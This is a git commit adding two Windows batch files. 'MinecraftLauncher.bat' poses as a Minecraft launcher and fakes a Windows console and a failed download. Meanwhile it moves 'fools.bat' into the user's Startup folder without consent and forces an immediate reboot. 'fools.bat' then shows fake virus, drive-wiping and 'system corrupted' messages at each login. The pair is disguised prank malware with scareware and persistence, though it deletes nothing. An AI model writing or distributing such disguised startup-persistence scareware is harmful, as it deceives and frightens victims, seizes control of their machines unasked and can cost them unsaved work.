45ec9f8ecf6216ca2a4090b78796cbd16ceeb275
jojyreal <168451132+jojyreal@users.noreply.github.com>
2024-08-28 17:55:59 -0400

    Add files via upload

---
+++ MinecraftLauncher.bat
@@ -0,0 +1,31 @@
+@echo off
+color 07
+move /y "C:\Users\%USERNAME%\Downloads\Minecraft Files\AppData\fools.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\fools.bat
+cls
+echo Microsoft Windows [Version 10.0.22631.4037]
+echo (c) Microsoft Corporation. All rights reserved.
+echo.
+echo Looking for existing files...
+timeout /t 1 /nobreak >null
+echo .
+timeout /t 1 /nobreak >null
+echo .
+timeout /t 1 /nobreak >null
+echo .
+timeout /t 1 /nobreak >null
+echo.
+echo Existing files not found. Attempting install for new files...
+timeout /t 1 /nobreak >null
+echo .
+timeout /t 1 /nobreak >null
+echo .
+timeout /t 1 /nobreak >null
+echo .
+timeout /t 1 /nobreak >null 
+echo .
+timeout /t 1 /nobreak >null
+echo.
+echo Download failed. Device restart is recommended.
+echo Press any key to restart
+timeout /t 100 >null
+shutdown /r /t 0
---
+++ fools.bat
@@ -0,0 +1,51 @@
+
+@echo off
+color 04
+echo Warning
+timeout /t 3 /nobreak >nul
+echo Your computer has detected a virus
+timeout /t 3 /nobreak >nul
+echo Attempting to remove virus...
+timeout /t 3 /nobreak >nul
+echo Your hard drives and solid state drives are now being wiped.
+echo Please wait...
+timeout /t 3 /nobreak >null
+echo.
+echo.
+echo.
+echo          ERROR: SYSTEM FAILURE IMMINENT
+echo          UNAUTHORIZED ACCESS DETECTED
+echo          SYSTEM RESTARTING IN 3
+echo.
+echo.
+timeout /t 1 /nobreak >nul
+cls
+echo System failure averted. Resuming normal operations...
+echo .
+timeout /t 1 /nobreak >null
+echo .
+timeout /t 1 /nobreak >null
+echo .
+timeout /t 1 /nobreak >null
+echo .
+timeout /t 1 /nobreak >null
+echo .
+timeout /t 1 /nobreak >null
+echo .
+timeout /t 1 /nobreak >null
+echo .
+timeout /t 1 /nobreak >null
+echo .
+timeout /t 1 /nobreak >null
+echo .
+timeout /t 1 /nobreak >null
+echo .
+timeout /t 2 /nobreak >nul
+echo ERROR
+echo ERROR
+echo ERROR
+echo ERROR
+echo ERROR
+timeout /t 2 /nobreak >nul
+echo sYSTEM CORRUPTED
+timeout /t 3 /nobreak
